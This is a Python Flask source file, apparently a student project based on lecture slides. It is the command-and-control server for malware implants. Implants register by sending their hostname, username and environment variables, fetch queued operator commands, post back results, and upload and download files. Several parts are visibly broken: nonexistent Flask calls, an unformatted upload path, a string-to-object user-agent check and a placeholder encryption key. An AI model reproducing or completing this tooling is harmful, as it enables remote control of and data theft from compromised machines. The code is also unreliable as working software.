##from lecture slides, refrenced 0xRick c2 code

import sqlite3
from flask import Flask, request, jsonify
import threading
import os, sys, random, string
from app.models.agent import agents
import multiprocessing as mp
from multiprocessing import Process
import requests 
from app.app import createFlaskApp
import uuid
from werkzeug.utils import secure_filename


"""控制端表"""

c2_server = "http://0.0.0.0:8080"
lock = mp.Lock()
implant_lock = mp.Lock()
TASKS = []
AGENTS = []

createflask = createFlaskApp()
app = createflask.create_app()
encryptionkey = None


@app.route("/upload/<filename>", methods = ["POST"])
def upload_files(filename):
#from flask documentation
    if request.method == 'POST':
        path = "data/listeners/{__name__}/"
        if os.path.exists(path) == False:
            os.mkdir(path)
        app.config['UPLOAD_FOLDER'] = path
        print("make sure your file exists and is in the correct directory")
        if 'file' not in request.files:
            Flask.flash('No file part')
            return Flask.redirect(request.url)
        
        file = request.files['file']
        if file and file.filename != '':
            filename = secure_filename(file.filename)
            file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
            print('successfully uploaded file')
            return ''
    return ''
        
@app.route('/downloads/<filename>', methods = ["GET"])
def download_file(filename):
    return request.send_from_directory(app.config["UPLOAD_FOLDER"], filename)


@app.route("/tasks", methods=["GET"])
def download_tasks():
    global TASKS
    lock.acquire()
    try:
        batch = "\n".join(TASKS[:5])
        TASKS = TASKS[5:]
    finally:
        lock.release()
    return batch 

@app.route("/response", methods=["POST"])
def print_response():
    print(request.data.decode())
    return ""

@app.route("/queue")
def print_queue():
    return jsonify(TASKS)

@app.route("/secret", methods=["POST"])
def add_request():
    r = request.json
    lock.acquire()
    try:
        for cmd in r:
            TASKS.append(cmd)
    finally:
        lock.release()
    print("Queued up ", r)
    return "True"

@app.route("/register", methods=['POST', 'GET'])
def addAgent():
    user_agent = request.user_agent
    if (user_agent == 'authenticated'):
        implant_id = str(uuid.uuid4())
        fromimplant = request.get_json()
        guid = fromimplant['guid']
        hostname = fromimplant['hostname']
        username = fromimplant['username']
        environment_variables = fromimplant["enviroment_variables"]
        implant_ip = request.environ['REMOTE_ADDR']
        print(fromimplant, implant_ip, implant_id)
        encryption_key = encryptionkey()
        #agent = agents(implant_id, guid, hostname, username, implant_ip, encryptionkey)
        #addtodatabase(agent)
        return jsonify(encryption_key)
    else:
        return jsonify("you're not authorized >:(")

def encryptionkey():
    #if encryptionkey == None:
    #    encryptionkey = getencryptionkey()
    encryptionkey = "blahblahblah"
    return encryptionkey

    
    
    
    
    
    
    
    
    
    
    
